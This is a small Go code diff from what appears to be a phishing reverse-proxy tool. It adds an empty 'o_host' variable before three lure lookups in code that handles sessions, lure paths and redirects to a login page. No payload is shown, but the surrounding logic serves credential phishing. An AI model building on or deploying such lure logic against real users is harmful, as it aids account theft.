@@ -303,6 +303,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
+					o_host := ""
 					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
@@ -472,6 +473,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
+						o_host := ""
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -578,6 +580,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
+					o_host := ""
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
